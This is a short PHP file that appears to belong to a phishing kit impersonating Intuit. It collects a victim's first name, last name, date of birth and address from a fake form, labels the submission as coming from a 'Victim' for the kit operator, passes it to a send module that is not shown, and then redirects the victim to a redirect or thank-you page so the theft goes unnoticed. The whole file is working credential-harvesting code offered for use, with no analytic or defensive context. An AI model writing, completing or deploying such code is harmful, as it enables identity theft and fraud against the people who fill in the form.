<?php
require_once('./Module/Setmodule.php');


$message .= "|Wassup, $yourname|| #Victim Submited PERSONAL DETAILS to your INTUIT page \n"."\n";
$message .= "|First Name: ".$_POST['fname']."\n"; 
$message .= "|Last Name: ".$_POST['lname']."\n"; 
$message .= "|DOB: ".$_POST['dob']."\n"; 
$message .= "|Address: ".$_POST['add']."\n"; 


require_once('Module/SendModule.php');


if($settings['Showemail'] == "1"){
    header("Location: ../redir.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
	header("Location: ../thankyou.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
?>